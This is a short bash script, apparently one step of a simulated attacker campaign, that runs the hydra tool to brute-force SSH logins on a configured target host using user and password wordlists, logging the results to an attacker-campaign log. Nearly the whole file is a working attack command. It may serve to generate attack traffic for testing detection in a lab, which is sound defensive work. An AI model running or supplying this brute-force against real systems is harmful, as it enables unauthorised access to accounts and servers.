#!/bin/bash
set -uo pipefail
source "$(dirname "$0")/common.sh"

log "BRUTEFORCE" "Starting hydra SSH brute-force against ${TARGET_HOST}:${TARGET_SSH_PORT}"
hydra -L /scripts/wordlists/users.txt -P /scripts/wordlists/passwords.txt -t 4 -f \
  -o "$LOG_DIR/hydra-ssh-$(date +%s).txt" \
  "ssh://${TARGET_HOST}:${TARGET_SSH_PORT}" 2>&1 | tee -a "$LOG_DIR/attacker-campaign.log"
log "BRUTEFORCE" "hydra SSH brute-force complete"
